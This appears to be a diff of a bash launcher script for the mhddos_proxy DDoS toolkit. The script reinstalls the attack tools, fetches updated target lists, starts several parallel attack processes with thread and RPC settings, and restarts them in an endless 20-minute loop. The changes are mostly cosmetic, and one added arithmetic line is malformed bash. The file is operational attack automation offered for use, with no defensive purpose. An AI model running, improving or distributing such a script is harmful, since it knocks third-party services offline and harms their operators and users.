@@ -2,13 +2,12 @@
 
 #Just in case kill previous copy of mhddos_proxy and finder
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
-sudo pkill -e -f runner.py
-sudo pkill -e -f finder.py
-#sudo docker kill $(sudo docker ps -aqf ancestor=elwahab/dd-attack)
+sudo pkill -f runner.py
+sudo pkill -f finder.py
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
 
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling our new proxy_finder...\033[0;0m\n"
-sleep 3s
+sleep 3
 cd ~
 sudo rm -rf proxy_finder
 sudo rm -rf mhddos_proxy
@@ -28,7 +27,7 @@ python3 -m pip install -r requirements.txt
 cd ~
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mFiles installed successfully\033[1;0m\n\n"
 
-restart_interval="20m"
+restart_interval="1200"
 
 ulimit -n 1048576
 
@@ -41,6 +40,9 @@ sudo chown -R ${USER}:${USER} /home/${USER}/proxy_finder
 sudo git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest_lite
 sudo git config --global --add safe.directory /home/${USER}/mhddos_proxy
 sudo git config --global --add safe.directory /home/${USER}/proxy_finder
+sudo git config --global --add safe.directory ~/auto_mhddos_alexnest_lite
+sudo git config --global --add safe.directory ~/mhddos_proxy
+sudo git config --global --add safe.directory ~/proxy_finder
 
 num_of_copies="${1:-1}"
 if [[ "$num_of_copies" == "all" ]];
@@ -112,7 +114,7 @@ then
 	#rand=$(shuf -i 1-2 -n 1)
 fi
 
-sleep 5s
+sleep 5
 
 # Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
@@ -130,7 +132,7 @@ do
 		python3 -m pip install -r requirements.txt
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
-		sleep 2s
+		sleep 2
 	fi
 	
 	cd ~/proxy_finder	
@@ -146,7 +148,7 @@ do
 		python3 -m pip install -r requirements.txt
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder"
-		sleep 2s
+		sleep 2
 	fi
 	
 	cd ~/auto_mhddos_alexnest
@@ -163,7 +165,7 @@ do
 		bash runner.sh $num_of_copies $threads $rpc $debug # run new downloaded script 
 	fi
 	#
-   	sleep 3s
+   	sleep 3
 	
 	if ((rand == 2));
 	then
@@ -183,7 +185,7 @@ do
 		
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
-		sleep 3s
+		sleep 3
 		# Launch multiple mhddos_proxy instances with different targets.
    		for i in $random_numbers
    		do
@@ -197,7 +199,7 @@ do
             
             		cd ~/mhddos_proxy
             		python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
-	    		sleep 20s
+	    		sleep 20
 
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    		done
@@ -221,7 +223,7 @@ do
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 		
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack(s) with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
-		sleep 3s
+		sleep 3
 		# Launch multiple mhddos_proxy instances with different targets.
    		for i in $random_numbers
    		do
@@ -235,19 +237,19 @@ do
             
             		cd ~/mhddos_proxy
             		python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
-	    		sleep 20s
+	    		sleep 20
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 		done
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
-		sleep 5s
+		sleep 5
 		#echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
-		#sleep 2s
+		#sleep 2
 		#cd ~/proxy_finder
 		#python3 finder.py --threads 1000&
 	else
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
-		sleep 3s
+		sleep 3
 		cd ~/proxy_finder
 		python3 finder.py&
 	fi
@@ -261,7 +263,8 @@ do
 	sudo pkill -e -f finder.py
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
 	
-   	no_ddos_sleep="$(shuf -i 1-3 -n 1)m"
+   	no_ddos_sleep="$(shuf -i 1-3 -n 1)"
+	$ (( no_ddos_sleep=no_ddos_sleep*60 ))
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
 	sleep $no_ddos_sleep
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
